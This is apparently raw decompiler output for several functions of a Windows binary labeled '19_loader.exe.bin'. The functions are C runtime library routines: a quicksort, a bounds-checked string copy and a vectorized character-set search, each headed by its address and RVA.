    *(undefined4 *)puVar3 = 0x16;
    FUN_1400180c4();
    FUN_14001fbf8();
    return;
  }
  _guard_check_icall();
  FUN_1400225e0((undefined1 (*) [32])local_438,0,0x1f0);
  FUN_1400225e0((undefined1 (*) [32])local_248,0,0x1f0);
  if (param_2 < 2) {
code_r0x00014001fbf8:
    FUN_14001a2d0(local_58 ^ (ulonglong)auStack_468);
    return;
  }
  lStack_448 = 0;
  puVar10 = param_1 + (param_2 - 1) * param_3;
LAB_14001f940:
  uVar9 = (ulonglong)((longlong)puVar10 - (longlong)param_1) / param_3 + 1;
  if (8 < uVar9) {
    lVar5 = (uVar9 >> 1) * param_3;
    puVar4 = param_1 + lVar5;
    iVar2 = (*(code *)param_4)(param_1,puVar4);
    if (0 < iVar2) {
      puVar6 = puVar4;
      uVar9 = param_3;
      if (param_1 != puVar4) {
        do {
          uVar1 = puVar6[-lVar5];
          puVar6[-lVar5] = *puVar6;
          *puVar6 = uVar1;
          uVar9 = uVar9 - 1;
          puVar6 = puVar6 + 1;
        } while (uVar9 != 0);
      }
    }
    iVar2 = (*(code *)param_4)(param_1,puVar10);
    if ((0 < iVar2) && (param_1 != puVar10)) {
      puVar6 = puVar10;
      uVar9 = param_3;
      do {
        uVar1 = puVar6[(longlong)param_1 - (longlong)puVar10];
        puVar6[(longlong)param_1 - (longlong)puVar10] = *puVar6;
        *puVar6 = uVar1;
        puVar6 = puVar6 + 1;
        uVar9 = uVar9 - 1;
      } while (uVar9 != 0);
    }
    iVar2 = (*(code *)param_4)(puVar4);
    if ((0 < iVar2) && (puVar4 != puVar10)) {
      puVar6 = puVar10;
      uVar9 = param_3;
      do {
        uVar1 = puVar6[(longlong)puVar4 - (longlong)puVar10];
        puVar6[(longlong)puVar4 - (longlong)puVar10] = *puVar6;
        *puVar6 = uVar1;
        puVar6 = puVar6 + 1;
        uVar9 = uVar9 - 1;
      } while (uVar9 != 0);
    }
    puVar6 = param_1;
    puVar8 = puVar10;
    do {
      if (puVar6 < puVar4) {
        do {
          puVar6 = puVar6 + param_3;
          if (puVar4 <= puVar6) goto LAB_14001fad0;
          iVar2 = (*(code *)param_4)(puVar6);
        } while (iVar2 < 1);
      }
      else {
LAB_14001fad0:
        do {
          puVar6 = puVar6 + param_3;
          if (puVar10 < puVar6) break;
          iVar2 = (*(code *)param_4)(puVar6);
        } while (iVar2 < 1);
      }
      do {
        puVar7 = puVar8;
        puVar8 = puVar7 + -param_3;
        if (puVar8 <= puVar4) break;
        iVar2 = (*(code *)param_4)(puVar8);
      } while (0 < iVar2);
      if (puVar8 < puVar6) goto LAB_14001fb3a;
      if (puVar8 != puVar6) {
        puVar7 = puVar8;
        uVar9 = param_3;
        do {
          uVar1 = puVar7[(longlong)puVar6 - (longlong)puVar8];
          puVar7[(longlong)puVar6 - (longlong)puVar8] = *puVar7;
          *puVar7 = uVar1;
          puVar7 = puVar7 + 1;
          uVar9 = uVar9 - 1;
        } while (uVar9 != 0);
      }
      puVar7 = puVar6;
      if (puVar4 != puVar8) {
        puVar7 = puVar4;
      }
      puVar4 = puVar7;
    } while( true );
  }
  puVar6 = param_1;
  puVar4 = param_1;
  if (param_1 < puVar10) {
    do {
      while( true ) {
        puVar8 = puVar6;
        puVar4 = puVar4 + param_3;
        if (puVar10 < puVar4) break;
        iVar2 = (*(code *)param_4)(puVar4,puVar8);
        puVar6 = puVar4;
        if (iVar2 < 1) {
          puVar6 = puVar8;
        }
      }
      if (puVar8 != puVar10) {
        puVar4 = puVar10;
        uVar9 = param_3;
        do {
          uVar1 = puVar4[(longlong)puVar8 - (longlong)puVar10];
          puVar4[(longlong)puVar8 - (longlong)puVar10] = *puVar4;
          *puVar4 = uVar1;
          puVar4 = puVar4 + 1;
          uVar9 = uVar9 - 1;
        } while (uVar9 != 0);
      }
      puVar10 = puVar10 + -param_3;
      puVar6 = param_1;
      puVar4 = param_1;
    } while (param_1 < puVar10);
  }
  goto LAB_14001f9c3;
LAB_14001fb3a:
  if (puVar4 < puVar7) {
    do {
      puVar7 = puVar7 + -param_3;
      if (puVar7 <= puVar4) goto LAB_14001fb57;
      iVar2 = (*(code *)param_4)(puVar7);
    } while (iVar2 == 0);
  }
  else {
LAB_14001fb57:
    do {
      puVar7 = puVar7 + -param_3;
      if (puVar7 <= param_1) break;
      iVar2 = (*(code *)param_4)(puVar7);
    } while (iVar2 == 0);
  }
  if ((longlong)puVar7 - (longlong)param_1 < (longlong)puVar10 - (longlong)puVar6) {
    if (puVar6 < puVar10) {
      local_438[lStack_448] = puVar6;
      local_248[lStack_448] = puVar10;
      lStack_448 = lStack_448 + 1;
    }
    if (param_1 < puVar7) {
      puVar10 = puVar7;
      goto LAB_14001f940;
    }
  }
  else {
    if (param_1 < puVar7) {
      local_438[lStack_448] = param_1;
      local_248[lStack_448] = puVar7;
      lStack_448 = lStack_448 + 1;
    }
    if (puVar6 < puVar10) {
      param_1 = puVar6;
      goto LAB_14001f940;
    }
  }
LAB_14001f9c3:
  lStack_448 = lStack_448 + -1;
  if (-1 < lStack_448) {
    param_1 = (undefined1 *)local_438[lStack_448];
    puVar10 = (undefined1 *)local_248[lStack_448];
    goto LAB_14001f940;
  }
  goto code_r0x00014001fbf8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f912 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f912 rva=0x1f912 */

void FUN_14001f912(void)

{
  undefined1 uVar1;
  int iVar2;
  undefined1 *puVar3;
  longlong lVar4;
  undefined1 *puVar5;
  undefined1 *puVar6;
  undefined1 *puVar7;
  ulonglong uVar8;
  code *unaff_R12;
  undefined1 *unaff_R13;
  ulonglong unaff_R14;
  longlong unaff_R15;
  undefined1 *puVar9;
  undefined1 uStack0000000000000000;
  longlong local_res20;
  undefined1 uStack0000000000000030;
  ulonglong in_stack_00000410;
  
  local_res20 = 0;
  puVar9 = unaff_R13 + unaff_R15 * unaff_R14;
LAB_14001f940:
  uVar8 = (ulonglong)((longlong)puVar9 - (longlong)unaff_R13) / unaff_R14 + 1;
  if (8 < uVar8) {
    lVar4 = (uVar8 >> 1) * unaff_R14;
    puVar3 = unaff_R13 + lVar4;
    iVar2 = (*unaff_R12)(unaff_R13,puVar3);
    if (0 < iVar2) {
      puVar5 = puVar3;
      uVar8 = unaff_R14;
      if (unaff_R13 != puVar3) {
        do {
          uVar1 = puVar5[-lVar4];
          puVar5[-lVar4] = *puVar5;
          *puVar5 = uVar1;
          uVar8 = uVar8 - 1;
          puVar5 = puVar5 + 1;
        } while (uVar8 != 0);
      }
    }
    iVar2 = (*unaff_R12)(unaff_R13,puVar9);
    if ((0 < iVar2) && (unaff_R13 != puVar9)) {
      puVar5 = puVar9;
      uVar8 = unaff_R14;
      do {
        uVar1 = puVar5[(longlong)unaff_R13 - (longlong)puVar9];
        puVar5[(longlong)unaff_R13 - (longlong)puVar9] = *puVar5;
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
        uVar8 = uVar8 - 1;
      } while (uVar8 != 0);
    }
    iVar2 = (*unaff_R12)(puVar3);
    if ((0 < iVar2) && (puVar3 != puVar9)) {
      puVar5 = puVar9;
      uVar8 = unaff_R14;
      do {
        uVar1 = puVar5[(longlong)puVar3 - (longlong)puVar9];
        puVar5[(longlong)puVar3 - (longlong)puVar9] = *puVar5;
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
        uVar8 = uVar8 - 1;
      } while (uVar8 != 0);
    }
    puVar5 = unaff_R13;
    puVar7 = puVar9;
    do {
      if (puVar5 < puVar3) {
        do {
          puVar5 = puVar5 + unaff_R14;
          if (puVar3 <= puVar5) goto LAB_14001fad0;
          iVar2 = (*unaff_R12)(puVar5);
        } while (iVar2 < 1);
      }
      else {
LAB_14001fad0:
        do {
          puVar5 = puVar5 + unaff_R14;
          if (puVar9 < puVar5) break;
          iVar2 = (*unaff_R12)(puVar5);
        } while (iVar2 < 1);
      }
      do {
        puVar6 = puVar7;
        puVar7 = puVar6 + -unaff_R14;
        if (puVar7 <= puVar3) break;
        iVar2 = (*unaff_R12)(puVar7);
      } while (0 < iVar2);
      if (puVar7 < puVar5) goto LAB_14001fb3a;
      if (puVar7 != puVar5) {
        puVar6 = puVar7;
        uVar8 = unaff_R14;
        do {
          uVar1 = puVar6[(longlong)puVar5 - (longlong)puVar7];
          puVar6[(longlong)puVar5 - (longlong)puVar7] = *puVar6;
          *puVar6 = uVar1;
          puVar6 = puVar6 + 1;
          uVar8 = uVar8 - 1;
        } while (uVar8 != 0);
      }
      puVar6 = puVar5;
      if (puVar3 != puVar7) {
        puVar6 = puVar3;
      }
      puVar3 = puVar6;
    } while( true );
  }
  puVar5 = unaff_R13;
  puVar3 = unaff_R13;
  if (unaff_R13 < puVar9) {
    do {
      while( true ) {
        puVar7 = puVar5;
        puVar3 = puVar3 + unaff_R14;
        if (puVar9 < puVar3) break;
        iVar2 = (*unaff_R12)(puVar3,puVar7);
        puVar5 = puVar3;
        if (iVar2 < 1) {
          puVar5 = puVar7;
        }
      }
      if (puVar7 != puVar9) {
        puVar3 = puVar9;
        uVar8 = unaff_R14;
        do {
          uVar1 = puVar3[(longlong)puVar7 - (longlong)puVar9];
          puVar3[(longlong)puVar7 - (longlong)puVar9] = *puVar3;
          *puVar3 = uVar1;
          puVar3 = puVar3 + 1;
          uVar8 = uVar8 - 1;
        } while (uVar8 != 0);
      }
      puVar9 = puVar9 + -unaff_R14;
      puVar5 = unaff_R13;
      puVar3 = unaff_R13;
    } while (unaff_R13 < puVar9);
  }
  goto LAB_14001f9c3;
LAB_14001fb3a:
  if (puVar3 < puVar6) {
    do {
      puVar6 = puVar6 + -unaff_R14;
      if (puVar6 <= puVar3) goto LAB_14001fb57;
      iVar2 = (*unaff_R12)(puVar6);
    } while (iVar2 == 0);
  }
  else {
LAB_14001fb57:
    do {
      puVar6 = puVar6 + -unaff_R14;
      if (puVar6 <= unaff_R13) break;
      iVar2 = (*unaff_R12)(puVar6);
    } while (iVar2 == 0);
  }
  if ((longlong)puVar6 - (longlong)unaff_R13 < (longlong)puVar9 - (longlong)puVar5) {
    if (puVar5 < puVar9) {
      *(undefined1 **)(&uStack0000000000000030 + local_res20 * 8) = puVar5;
      *(undefined1 **)((longlong)register0x00000020 + local_res20 * 8 + 0x220) = puVar9;
      local_res20 = local_res20 + 1;
    }
    if (unaff_R13 < puVar6) {
      puVar9 = puVar6;
      goto LAB_14001f940;
    }
  }
  else {
    if (unaff_R13 < puVar6) {
      *(undefined1 **)(&uStack0000000000000030 + local_res20 * 8) = unaff_R13;
      *(undefined1 **)((longlong)register0x00000020 + local_res20 * 8 + 0x220) = puVar6;
      local_res20 = local_res20 + 1;
    }
    if (puVar5 < puVar9) {
      unaff_R13 = puVar5;
      goto LAB_14001f940;
    }
  }
LAB_14001f9c3:
  local_res20 = local_res20 + -1;
  if (local_res20 < 0) {
    FUN_14001a2d0(in_stack_00000410 ^ (ulonglong)&uStack0000000000000000);
    return;
  }
  unaff_R13 = *(undefined1 **)(&uStack0000000000000030 + local_res20 * 8);
  puVar9 = *(undefined1 **)((longlong)register0x00000020 + local_res20 * 8 + 0x220);
  goto LAB_14001f940;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1fbf8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001fbf8 rva=0x1fbf8 */

void FUN_14001fbf8(void)

{
  undefined1 uStack0000000000000000;
  ulonglong in_stack_00000410;
  
  FUN_14001a2d0(in_stack_00000410 ^ (ulonglong)&uStack0000000000000000);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1fc20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001fc20 rva=0x1fc20 */

undefined4 FUN_14001fc20(char *param_1,longlong param_2,longlong param_3,longlong param_4)

{
  char cVar1;
  undefined8 *puVar2;
  longlong lVar3;
  char *pcVar4;
  longlong lVar5;
  longlong lVar6;
  
  if (param_4 == 0) {
    if (param_1 == (char *)0x0) {
      if (param_2 == 0) {
        return 0;
      }
      goto LAB_14001fc79;
    }
  }
  else if (param_1 == (char *)0x0) goto LAB_14001fc79;
  if (param_2 != 0) {
    if (param_4 == 0) {
      *param_1 = '\0';
      return 0;
    }
    if (param_3 != 0) {
      pcVar4 = param_1;
      lVar5 = param_2;
      lVar3 = param_4;
      if (param_4 == -1) {
        do {
          cVar1 = pcVar4[param_3 - (longlong)param_1];
          *pcVar4 = cVar1;
          if (cVar1 == '\0') {
            return 0;
          }
          lVar5 = lVar5 + -1;
          pcVar4 = pcVar4 + 1;
        } while (lVar5 != 0);
        lVar5 = 0;
      }
      else {
        do {
          lVar6 = lVar3;
          cVar1 = pcVar4[param_3 - (longlong)param_1];
          *pcVar4 = cVar1;
          pcVar4 = pcVar4 + 1;
          if (cVar1 == '\0') {
            return 0;
          }
          lVar5 = lVar5 + -1;
        } while ((lVar5 != 0) && (lVar3 = lVar6 + -1, lVar6 + -1 != 0));
        lVar3 = lVar6 + -1;
        if (lVar5 == 0) {
          lVar3 = lVar6;
        }
        if (lVar3 == 0) {
          *pcVar4 = '\0';
        }
      }
      if (lVar5 != 0) {
        return 0;
      }
      if (param_4 == -1) {
        param_1[param_2 + -1] = '\0';
        return 0x50;
      }
      *param_1 = '\0';
      puVar2 = FUN_140018dec();
      *(undefined4 *)puVar2 = 0x22;
      FUN_1400180c4();
      return 0x22;
    }
    *param_1 = '\0';
  }
LAB_14001fc79:
  puVar2 = FUN_140018dec();
  *(undefined4 *)puVar2 = 0x16;
  FUN_1400180c4();
  return 0x16;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1fd50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001fd50 rva=0x1fd50 */

/* WARNING: Removing unreachable block (ram,0x00014001ffec) */
/* WARNING: Removing unreachable block (ram,0x00014001ffe5) */
/* WARNING: Removing unreachable block (ram,0x00014001ffde) */
/* WARNING: Removing unreachable block (ram,0x00014001ffd7) */
/* WARNING: Removing unreachable block (ram,0x00014001ffd0) */
/* WARNING: Removing unreachable block (ram,0x00014001ffc9) */
/* WARNING: Removing unreachable block (ram,0x00014001ffc2) */
/* WARNING: Removing unreachable block (ram,0x00014001ffbb) */
/* WARNING: Removing unreachable block (ram,0x00014001ffb4) */
/* WARNING: Removing unreachable block (ram,0x00014001ffad) */
/* WARNING: Removing unreachable block (ram,0x00014001ffa6) */
/* WARNING: Removing unreachable block (ram,0x00014001ff9f) */
/* WARNING: Removing unreachable block (ram,0x00014001ff98) */
/* WARNING: Removing unreachable block (ram,0x00014001ff91) */
/* WARNING: Removing unreachable block (ram,0x00014001ff8a) */
/* WARNING: Removing unreachable block (ram,0x00014001fe4d) */
/* WARNING: Removing unreachable block (ram,0x00014001fe5c) */
/* WARNING: Removing unreachable block (ram,0x00014001fe6b) */
/* WARNING: Removing unreachable block (ram,0x00014001fe7a) */
/* WARNING: Removing unreachable block (ram,0x00014001fe89) */
/* WARNING: Removing unreachable block (ram,0x00014001fe95) */
/* WARNING: Removing unreachable block (ram,0x00014001fea1) */
/* WARNING: Removing unreachable block (ram,0x00014001fead) */
/* WARNING: Removing unreachable block (ram,0x00014001feb9) */
/* WARNING: Removing unreachable block (ram,0x00014001fec5) */
/* WARNING: Removing unreachable block (ram,0x00014001fed1) */
/* WARNING: Removing unreachable block (ram,0x00014001fedd) */
/* WARNING: Removing unreachable block (ram,0x00014001fee9) */
/* WARNING: Removing unreachable block (ram,0x00014001fef5) */
/* WARNING: Removing unreachable block (ram,0x00014001ff01) */

byte * FUN_14001fd50(byte *param_1,byte *param_2)

{
  byte bVar1;
  uint uVar2;
  ushort uVar3;
  undefined1 auVar4 [16];
  undefined1 auVar5 [16];
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  undefined1 auVar16 [16];
  undefined1 auVar17 [16];
  undefined1 auVar18 [16];
  byte *pbVar19;
  undefined1 (*pauVar20) [16];
  ulonglong uVar21;
  undefined1 auVar22 [16];
  longlong lVar25;
  undefined1 auVar23 [16];
  undefined1 auVar24 [16];
  undefined1 auVar26 [16];
  undefined1 auVar27 [16];
  undefined1 auVar28 [16];
  undefined1 auVar29 [16];
  undefined1 auVar30 [16];
  undefined1 auVar31 [16];
  undefined1 auVar32 [16];
  undefined1 auVar33 [16];
  undefined1 auVar34 [16];
  
  uVar21 = (ulonglong)((uint)param_2 & 0xf);
  pauVar20 = (undefined1 (*) [16])(param_2 + -uVar21);
  auVar33 = *pauVar20;
  switch(uVar21) {
  case 1:
    auVar33 = auVar33 >> 8;
    break;
  case 2:
    auVar33 = auVar33 >> 0x10;
    break;
  case 3:
    auVar33 = auVar33 >> 0x18;
    break;
  case 4:
    auVar33 = auVar33 >> 0x20;
    break;
  case 5:
    auVar33 = auVar33 >> 0x28;
    break;
  case 6:
    auVar33 = auVar33 >> 0x30;
    break;
  case 7:
    auVar33 = auVar33 >> 0x38;
    break;
  case 8:
    auVar33 = auVar33 >> 0x40;
    break;
  case 9:
    auVar33 = auVar33 >> 0x48;
    break;
  case 10:
    auVar33 = auVar33 >> 0x50;
    break;
  case 0xb:
    auVar33 = auVar33 >> 0x58;
    break;
  case 0xc:
    auVar33 = auVar33 >> 0x60;
    break;
  case 0xd:
    auVar33 = auVar33 >> 0x68;
    break;
  case 0xe:
    auVar33 = auVar33 >> 0x70;
    break;
  case 0xf:
    auVar33 = auVar33 >> 0x78;
  }
  auVar22[0] = -(auVar33[0] == '\0');
  auVar22[1] = -(auVar33[1] == '\0');
  auVar22[2] = -(auVar33[2] == '\0');
  auVar22[3] = -(auVar33[3] == '\0');
  auVar22[4] = -(auVar33[4] == '\0');
  auVar22[5] = -(auVar33[5] == '\0');
  auVar22[6] = -(auVar33[6] == '\0');
  auVar22[7] = -(auVar33[7] == '\0');
  auVar22[8] = -(auVar33[8] == '\0');
  auVar22[9] = -(auVar33[9] == '\0');
  auVar22[10] = -(auVar33[10] == '\0');
  auVar22[0xb] = -(auVar33[0xb] == '\0');
  auVar22[0xc] = -(auVar33[0xc] == '\0');
  auVar22[0xd] = -(auVar33[0xd] == '\0');
  auVar22[0xe] = -(auVar33[0xe] == '\0');
  auVar22[0xf] = -(auVar33[0xf] == '\0');
  uVar3 = (ushort)(SUB161(auVar22 >> 7,0) & 1) | (ushort)(SUB161(auVar22 >> 0xf,0) & 1) << 1 |
          (ushort)(SUB161(auVar22 >> 0x17,0) & 1) << 2 |
          (ushort)(SUB161(auVar22 >> 0x1f,0) & 1) << 3 |
          (ushort)(SUB161(auVar22 >> 0x27,0) & 1) << 4 |
          (ushort)(SUB161(auVar22 >> 0x2f,0) & 1) << 5 |
          (ushort)(SUB161(auVar22 >> 0x37,0) & 1) << 6 |
          (ushort)(SUB161(auVar22 >> 0x3f,0) & 1) << 7 |
          (ushort)(SUB161(auVar22 >> 0x47,0) & 1) << 8 |
          (ushort)(SUB161(auVar22 >> 0x4f,0) & 1) << 9 |
          (ushort)(SUB161(auVar22 >> 0x57,0) & 1) << 10 |
          (ushort)(SUB161(auVar22 >> 0x5f,0) & 1) << 0xb |
          (ushort)(SUB161(auVar22 >> 0x67,0) & 1) << 0xc |
          (ushort)(SUB161(auVar22 >> 0x6f,0) & 1) << 0xd |
          (ushort)(SUB161(auVar22 >> 0x77,0) & 1) << 0xe | (ushort)(auVar22[0xf] >> 7) << 0xf;
  if (uVar3 == 0) {
    if (uVar21 == 0) {
      if ((*pauVar20)[1] != '\0') {
        pbVar19 = (byte *)FUN_140020110(param_1,param_2);
        return pbVar19;
      }
      goto LAB_14001fff9;
    }
  }
  else {
    uVar2 = 0;
    if (uVar3 != 0) {
      for (; (uVar3 >> uVar2 & 1) == 0; uVar2 = uVar2 + 1) {
      }
    }
    lVar25 = auVar33._8_8_;
    switch(-uVar2) {
    case 0:
      auVar33 = ZEXT816(0);
      break;
    case 0xfffffff1:
      auVar26._0_8_ = auVar33._0_8_ << 8;
      auVar26._8_8_ = lVar25 << 8 | auVar33._0_8_ >> 0x38;
      auVar33 = auVar26 >> 8;
      break;
    case 0xfffffff2:
      auVar27._0_8_ = auVar33._0_8_ << 0x10;
      auVar27._8_8_ = lVar25 << 0x10 | auVar33._0_8_ >> 0x30;
      auVar33 = auVar27 >> 0x10;
      break;
    case 0xfffffff3:
      auVar28._0_8_ = auVar33._0_8_ << 0x18;
      auVar28._8_8_ = lVar25 << 0x18 | auVar33._0_8_ >> 0x28;
      auVar33 = auVar28 >> 0x18;
      break;
    case 0xfffffff4:
      auVar29._0_8_ = auVar33._0_8_ << 0x20;
      auVar29._8_8_ = lVar25 << 0x20 | auVar33._0_8_ >> 0x20;
      auVar33 = auVar29 >> 0x20;
      break;
    case 0xfffffff5:
      auVar30._0_8_ = auVar33._0_8_ << 0x28;
      auVar30._8_8_ = lVar25 << 0x28 | auVar33._0_8_ >> 0x18;
      auVar33 = auVar30 >> 0x28;
      break;
    case 0xfffffff6:
      auVar31._0_8_ = auVar33._0_8_ << 0x30;
      auVar31._8_8_ = lVar25 << 0x30 | auVar33._0_8_ >> 0x10;
      auVar33 = auVar31 >> 0x30;
      break;
    case 0xfffffff7:
      auVar32._0_8_ = auVar33._0_8_ << 0x38;
      auVar32._8_8_ = lVar25 << 0x38 | auVar33._0_8_ >> 8;
      auVar33 = auVar32 >> 0x38;
      break;
    case 0xfffffff8:
      auVar33._8_8_ = 0;
      break;
    case 0xfffffff9:
      auVar4._8_8_ = 0;
      auVar4._0_8_ = auVar33._0_8_ << 8;
      auVar33 = (auVar4 << 0x40) >> 0x48;
      break;
    case 0xfffffffa:
      auVar5._8_8_ = 0;
      auVar5._0_8_ = auVar33._0_8_ << 0x10;
      auVar33 = (auVar5 << 0x40) >> 0x50;
      break;
    case 0xfffffffb:
      auVar6._8_8_ = 0;
      auVar6._0_8_ = auVar33._0_8_ << 0x18;
      auVar33 = (auVar6 << 0x40) >> 0x58;
      break;
    case 0xfffffffc:
      auVar7._8_8_ = 0;
      auVar7._0_8_ = auVar33._0_8_ << 0x20;
      auVar33 = (auVar7 << 0x40) >> 0x60;
      break;
    case 0xfffffffd:
      auVar8._8_8_ = 0;
      auVar8._0_8_ = auVar33._0_8_ << 0x28;
      auVar33 = (auVar8 << 0x40) >> 0x68;
      break;
    case 0xfffffffe:
      auVar9._8_8_ = 0;
      auVar9._0_8_ = auVar33._0_8_ << 0x30;
      auVar33 = (auVar9 << 0x40) >> 0x70;
      break;
    case 0xffffffff:
      auVar10._8_8_ = 0;
      auVar10._0_8_ = auVar33._0_8_ << 0x38;
      auVar33 = (auVar10 << 0x40) >> 0x78;
    }
    if (uVar21 == 0 || (ulonglong)uVar2 < 0x10 - uVar21) goto LAB_14001fff9;
  }
  auVar34 = pauVar20[1];
  auVar23[0] = -(auVar34[0] == '\0');
  auVar23[1] = -(auVar34[1] == '\0');
  auVar23[2] = -(auVar34[2] == '\0');
  auVar23[3] = -(auVar34[3] == '\0');
  auVar23[4] = -(auVar34[4] == '\0');
  auVar23[5] = -(auVar34[5] == '\0');
  auVar23[6] = -(auVar34[6] == '\0');
  lVar25 = auVar34._8_8_;
  auVar23[7] = -(auVar34[7] == '\0');
  auVar23[8] = -(auVar34[8] == '\0');
  auVar23[9] = -(auVar34[9] == '\0');
  auVar23[10] = -(auVar34[10] == '\0');
  auVar23[0xb] = -(auVar34[0xb] == '\0');
  auVar23[0xc] = -(auVar34[0xc] == '\0');
  auVar23[0xd] = -(auVar34[0xd] == '\0');
  auVar23[0xe] = -(auVar34[0xe] == '\0');
  auVar23[0xf] = -(auVar34[0xf] == '\0');
  uVar3 = (ushort)(SUB161(auVar23 >> 7,0) & 1) | (ushort)(SUB161(auVar23 >> 0xf,0) & 1) << 1 |
          (ushort)(SUB161(auVar23 >> 0x17,0) & 1) << 2 |
          (ushort)(SUB161(auVar23 >> 0x1f,0) & 1) << 3 |
          (ushort)(SUB161(auVar23 >> 0x27,0) & 1) << 4 |
          (ushort)(SUB161(auVar23 >> 0x2f,0) & 1) << 5 |
          (ushort)(SUB161(auVar23 >> 0x37,0) & 1) << 6 |
          (ushort)(SUB161(auVar23 >> 0x3f,0) & 1) << 7 |
          (ushort)(SUB161(auVar23 >> 0x47,0) & 1) << 8 |
          (ushort)(SUB161(auVar23 >> 0x4f,0) & 1) << 9 |
          (ushort)(SUB161(auVar23 >> 0x57,0) & 1) << 10 |
          (ushort)(SUB161(auVar23 >> 0x5f,0) & 1) << 0xb |
          (ushort)(SUB161(auVar23 >> 0x67,0) & 1) << 0xc |
          (ushort)(SUB161(auVar23 >> 0x6f,0) & 1) << 0xd |
          (ushort)(SUB161(auVar23 >> 0x77,0) & 1) << 0xe | (ushort)(auVar23[0xf] >> 7) << 0xf;
  if (uVar3 != 0) {
    uVar2 = 0;
    if (uVar3 != 0) {
      for (; (uVar3 >> uVar2 & 1) == 0; uVar2 = uVar2 + 1) {
      }
    }
    if ((uVar2 - uVar21) + 0x10 < 0x11) {
      uVar21 = auVar34._0_8_;
      switch(-uVar2) {
      case 0:
        auVar34 = ZEXT816(0);
        break;
      case 0xfffffff1:
        auVar34._0_8_ = uVar21 << 8;
        auVar34._8_8_ = lVar25 << 8 | uVar21 >> 0x38;
        break;
      case 0xfffffff2:
        auVar34._0_8_ = uVar21 << 0x10;
        auVar34._8_8_ = lVar25 << 0x10 | uVar21 >> 0x30;
        break;
      case 0xfffffff3:
        auVar34._0_8_ = uVar21 << 0x18;
        auVar34._8_8_ = lVar25 << 0x18 | uVar21 >> 0x28;
        break;
      case 0xfffffff4:
        auVar34._0_8_ = uVar21 << 0x20;
        auVar34._8_8_ = lVar25 << 0x20 | uVar21 >> 0x20;
        break;
      case 0xfffffff5:
        auVar34._0_8_ = uVar21 << 0x28;
        auVar34._8_8_ = lVar25 << 0x28 | uVar21 >> 0x18;
        break;
      case 0xfffffff6:
        auVar34._0_8_ = uVar21 << 0x30;
        auVar34._8_8_ = lVar25 << 0x30 | uVar21 >> 0x10;
        break;
      case 0xfffffff7:
        auVar34._0_8_ = uVar21 << 0x38;
        auVar34._8_8_ = lVar25 << 0x38 | uVar21 >> 8;
        break;
      case 0xfffffff8:
        auVar11._8_8_ = 0;
        auVar11._0_8_ = uVar21;
        auVar34 = auVar11 << 0x40;
        break;
      case 0xfffffff9:
        auVar12._8_8_ = 0;
        auVar12._0_8_ = uVar21 << 8;
        auVar34 = auVar12 << 0x40;
        break;
      case 0xfffffffa:
        auVar13._8_8_ = 0;
        auVar13._0_8_ = uVar21 << 0x10;
        auVar34 = auVar13 << 0x40;
        break;
      case 0xfffffffb:
        auVar14._8_8_ = 0;
        auVar14._0_8_ = uVar21 << 0x18;
        auVar34 = auVar14 << 0x40;
        break;
      case 0xfffffffc:
        auVar15._8_8_ = 0;
        auVar15._0_8_ = uVar21 << 0x20;
        auVar34 = auVar15 << 0x40;
        break;
      case 0xfffffffd:
        auVar16._8_8_ = 0;
        auVar16._0_8_ = uVar21 << 0x28;
        auVar34 = auVar16 << 0x40;
        break;
      case 0xfffffffe:
        auVar17._8_8_ = 0;
        auVar17._0_8_ = uVar21 << 0x30;
        auVar34 = auVar17 << 0x40;
        break;
      case 0xffffffff:
        auVar18._8_8_ = 0;
        auVar18._0_8_ = uVar21 << 0x38;
        auVar34 = auVar18 << 0x40;
      }
      auVar33 = auVar33 | auVar34;
LAB_14001fff9:
      bVar1 = *param_1;
      while( true ) {
        if (bVar1 == 0) {
          return (byte *)0x0;
        }
        auVar24[0] = -(bVar1 == auVar33[0]);
        auVar24[1] = -(bVar1 == auVar33[1]);
        auVar24[2] = -(bVar1 == auVar33[2]);
        auVar24[3] = -(bVar1 == auVar33[3]);
        auVar24[4] = -(bVar1 == auVar33[4]);
        auVar24[5] = -(bVar1 == auVar33[5]);
        auVar24[6] = -(bVar1 == auVar33[6]);
        auVar24[7] = -(bVar1 == auVar33[7]);
        auVar24[8] = -(bVar1 == auVar33[8]);
        auVar24[9] = -(bVar1 == auVar33[9]);
        auVar24[10] = -(bVar1 == auVar33[10]);
        auVar24[0xb] = -(bVar1 == auVar33[0xb]);
        auVar24[0xc] = -(bVar1 == auVar33[0xc]);
        auVar24[0xd] = -(bVar1 == auVar33[0xd]);
        auVar24[0xe] = -(bVar1 == auVar33[0xe]);
        auVar24[0xf] = -(bVar1 == auVar33[0xf]);
        if ((((((((((((((((SUB161(auVar24 >> 7,0) & 1) != 0 || (SUB161(auVar24 >> 0xf,0) & 1) != 0)
                        || (SUB161(auVar24 >> 0x17,0) & 1) != 0) ||
                       (SUB161(auVar24 >> 0x1f,0) & 1) != 0) || (SUB161(auVar24 >> 0x27,0) & 1) != 0
                      ) || (SUB161(auVar24 >> 0x2f,0) & 1) != 0) ||
                    (SUB161(auVar24 >> 0x37,0) & 1) != 0) || (SUB161(auVar24 >> 0x3f,0) & 1) != 0)
                  || (SUB161(auVar24 >> 0x47,0) & 1) != 0) || (SUB161(auVar24 >> 0x4f,0) & 1) != 0)
                || (SUB161(auVar24 >> 0x57,0) & 1) != 0) || (SUB161(auVar24 >> 0x5f,0) & 1) != 0) ||
              (SUB161(auVar24 >> 0x67,0) & 1) != 0) || (SUB161(auVar24 >> 0x6f,0) & 1) != 0) ||
            (SUB161(auVar24 >> 0x77,0) & 1) != 0) || auVar24[0xf] < '\0') break;
        bVar1 = param_1[1];
        param_1 = param_1 + 1;
      }
      return param_1;
    }
  }
  pbVar19 = (byte *)FUN_140020110(param_1,param_2);
  return pbVar19;
}



